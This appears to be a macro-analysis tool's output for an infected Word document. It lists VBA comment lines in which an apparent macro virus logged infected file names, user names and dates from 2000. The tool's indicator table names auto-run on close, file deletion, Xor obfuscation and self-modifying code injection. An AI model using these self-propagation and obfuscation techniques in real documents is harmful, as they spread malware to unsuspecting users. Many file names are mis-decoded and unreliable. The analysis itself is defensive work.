' 2000TW-BM001.doc

' 匡도1

' 匡도1

' zwl우쌥.doc

' qxzd0003.doc

' qxzd0117-1.doc

' 2000TW-BM001.doc

' 匡도2.doc

' 覩죕와빵0.doc

' 覩죕와빵1.doc

' yp0004.doc

' 99적樓.doc

' 2000YPWT-004.doc

' F1233.doc

' ZDCH004.doc

' 놔뀌괩00.doc

' 嗜든넥覩꼼죕와빵츰데(�諧邂㏈�).doc

' 匡도1

' 2000TW-BM039.doc

' 2000TW-BM003.doc

' 2000TW-BM004.doc

' 2000TW-BM005.doc

' 2000TW-BM007.doc

' 2000TW-BM008.doc

' 2000TW-BM009.doc

' 2000TW-BM010.doc

' 2000TW-BM011.doc

' 2000TW-BM012.doc

' 2000TW-BM013.doc

' 2000TW-BM014.doc

' 2000TW-BM015.doc

' 2000TW-BM016.doc

' 2000TW-BM017.doc

' 2000TW-BM018.doc

' 2000TW-BM019.doc

' F1233.doc

' 2000TW-BM020.doc

' 匡도1

' 2000TW-BM021.doc

' 2000TW-BM020.doc

' 2000TW-BM022.doc

' 2000TW-BM023.doc

' 2000TW-BM024.doc

' 2000TW-BM025.doc

' 2000TW-BM026.doc

' 2000TW-BM027.doc

' 2000TW-BM028.doc

' 2000TW-BM031.doc

' 2000TW-BM032.doc

' 2000TW-BM035.doc

' 2000TW-BM036.doc

' 2000TW-BM037.doc

' 2000YPWT-001.doc

' 2000YPWT-002.doc

' qxzd0709-1.doc

' 壇   틘.doc

' F1233.doc

' 눈廬목駕2.doc

' 98'푠擧嗜든넥契撚50퓻탤츰.doc

' 琅뵀멩列（꿇틤）莖냥든켬.doc

' 壇   틘.doc

' 璂송-땜꼬-빤켓베적zhuzhou.doc

' qxzd0710-2.doc

' F1233(1).doc

' E20000517.doc

' RESUME(TaiweiBJ2t).doc

' jianlicstarwq(TaiweiBJ2t).doc

' 몸훙숌썽.doc

' 嗜든넥覩꼼죕淃커롸驕괩멩1.doc

' qxzd0711-1.doc

' qxzd0711-2.doc

' LG 든넥쵱룐痰瀾북셉.doc

' yp0001.doc

' qxzd0711-2.doc

' qxzd0711-1.doc

' qxzd0712-1.doc

' 숌저ZHR.doc

' qxzd0000.doc

' 饋簡롤痰.doc

' 눈廬庫（크浪）.doc

' qxzd0713.doc

' 눈廬庫（크浪）1.doc

' 98묩죕츠玖.doc

' 헹斂변(1).DOC

' ZHANGYI(1).doc

' 壇   틘(1).doc

' henry.doc

' job1.doc

' 벴있莖냥굶셕炬.doc

' 벴있莖냥굶셕炬.doc

' 莖북谿섈주001.doc

' 벴있莖마운饋簡헙워.doc

' 벴있莖5%芎푯.doc

' 벴있莖냥굶셕炬깊.doc

' 匡도1

' 놔뀌셕뺍3.doc

' 匡도1

' ADD.doc

' 무鱇숌썽.doc

' JXC.DOC

' 菱수깊.doc

' 菱수깊1.doc

' 눈廬庫（크浪）1.doc

' 琅운멩列(格契).doc

' 놔뀌괩멩04.doc

' 놔뀌괩멩03.doc

' 匡도1

' 匡도2

' 2000벴있槿섈좼饋簡寧응깊01.doc

' 匡도1

' 벴있莖롸토렘갭01.doc

' 벴있莖饋簡마운헙워.doc

' 꼿蛟슥쌈.doc

' 와빵츰쩌.doc

' 99njing놔뀌괩멩.doc

' XHW04.doc

' 벴있槿돨먁剋斤.doc

' JLI헙워-1.doc

' 붚질.doc

' XFZH98구戈쩌.doc

' 벴있槿98쾨뒀갛탤（ FAX�均ㅒ샬�.doc

' 2000묏鱗셕뺍.doc

' 2000쾨놔뀌괩멩01.doc

' 2000쾨놔뀌셕뺍.doc

' 놔뀌셕뺍03.doc

' 놔뀌셕뺍.doc

' 匡도2.doc

' 놔뀌괩멩01.doc

' 묏鱗鋼쨌.doc

' palm廊�溝穎逃㉫�.doc

' 벴있莖茄駱葵累01.doc

' 벴있莖茄駱葵累02.doc

' 섈주桿駱.doc

' 덮땜뒈혐벴있莖饋簡듐섟彊逕헙워.doc

' 밤멩갛탤-2000좼퀼1.doc

' 밤멩갛탤.doc

' 2000쾨밤멩갛탤헙워.doc

' 2000벴있槿붚질쉭饋簡寧응깊01.doc

' 벴있莖롸토렘갭.doc

' ~WRD0002.tmp

' 匡도1

' cute.doc

' PRICE.DOC

' 匡도2

' 2000쾨繫祇쩌.doc

' 묏鱗슥쌈섟悧써.doc

' 揭郭�俓�.doc

' 匡도1

' 珙엌尿묏鱗.doc

' 몸훙숌저.doc

' 12:00:34 오후 -Friday,1 Sep,2000
' Hanjung4
'
' 이력서.doc

' 0822.doc

' 0901.doc

'  人  .doc

' 벴벌路묏撚瓏駕삔�煐識�.doc

' 벴벌路묏撚瓏駕삔�煐識�.doc

' 8월보고서.doc

' 0904.doc

' 현금수표01.doc

' 0831.doc

' 문서1

' 차량구입.doc

' 0905.doc

' 0906.doc

' 08:39:13 오후 -Thursday,7 Sep,2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)
' 0906.doc

' 근태보고서.doc

' 하노이지점 본사보고 (2).doc

' 일일보고2 (2).doc

' facsimile(영문).doc

' 당지점 업무분장.doc

' 경쟁사정보입수관련.doc

' 사인사용신청서.doc

' 첨부--우리사주-청약-안내.doc

' 일일보고2 (4).doc

' 00년추석연휴복지시설운영계획.doc

' 일일 본사보고 (9).doc

' 일일 본사보고 (10).doc

' 일일 본사보고 (11).doc

' Daily Report (9).doc

' Daily Report (9).doc

' 0915.doc

' 0917.doc

' 일일보고2 (7).doc

' 우리사주청약-긴급파악.doc

' 0918 (1).doc

' 332-134.doc

' 332-131.doc

' 0920 (1).doc

' (긴급)우리사주주식배정현황.doc

' 필기2.doc

' 0921 (1).doc

' 필기2.doc

' 우리사주-개인별-최종배정현황.doc

' Daily Report (17).doc

' 0922 (1).doc

' 해외급여주소.doc

' 일일 본사보고 (12).doc

' 0925 (1).doc

' 일일보고2 (9).doc

' 내연발전PM-부고(진철규과장-부친).doc

' 부고(원자력QC-정동부반장).doc

' 체육대회관련-근태.doc

' DAILY REPORT (21).doc

' 일일보고2 (12).doc

' 1005 (1).doc

' p.t hanjung.doc

' 일일 본사보고.doc

' 04:32:55 오후 -Friday,6 Oct,2000
' 한중
'
' 일일 본사보고.doc

' FAX(영문).doc

' 강인섭의원-한중DCM골프회원권(경영관리부1009).doc

' Calculation of Tentative Price2.doc

' 별첨 1,3 Calculation of Tentative Price2.doc

' Final Draft_ HFControls 업무진행상황보고.doc

' 세금계산서입금표청구서.doc

' 대외공문(국문.워드).doc

' 대외공문2(국문.워드).doc

' 이인기의원-출자회사복비및 인건비(1012).doc

' 관계회사 결손금 발생 사유 및 대책(투자설명회0918).doc

' 2000국회예상질의답변서.doc

' 06:00:47 오후 -Wednesday,18 Oct,2000
' 김정오
'
' 경영관리부6.doc

' 경영관리부5.doc

' 경영관리부4.doc

' 경영관리부3.doc

' 최근투자부진(김방림-연구지원부).doc

' 경영관리부2.doc

' 경영관리부1.doc

' HSD 신주발행(국회).doc

' 현대 임대장비(국회).doc

' 진행중인 쟁송사안(국회).doc

' 삼성 경업금지(국회).doc

' 대우 어음금(국회).doc

' 맹형규(공공부문구조조정)실태.doc

' 나머지 SCHEDULE.doc

' 배기운의원국감-내연발전.doc

' 001017-국정감사예상 질의 답변(기술관리부).doc

' 03:49:05 오후 -Wednesday,18 Oct,2000
' 이창훈
'
' 001017-국정감사예상 질의 답변(기술관리부).doc

' 001017-국정감사예상 질의 답변.doc

' 회의소집통보서.doc

' 기술관리부.doc

' 10:01:36 오전 -Thursday,19 Oct,2000
' HANJUNG
'
' load_file.asp?id=2077&no=1

' 보강beam.doc

' 02:02:30 오후 -Monday,23 Oct,2000
' HANJUNG
'
' 보강beam.doc

' load_file.asp?id=2109&no=1

' 전산업무요청서.doc

' 08:53:26 오전 -Monday,30 Oct,2000
' HANJUNG
'
' 전산업무요청서.doc

' load_file.asp?id=2145&no=1

' DrumRod.doc

' equivalent_tube.doc

' 11:36:57 오전 -Tuesday,31 Oct,2000
' HANJUNG
'
' equivalent_tube.doc

' hsintao(OMRF).doc

' 03:37:29 오후 -Monday,6 Nov,2000
' HANJUNG
'
' hsintao.doc

' PRINTING.doc

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

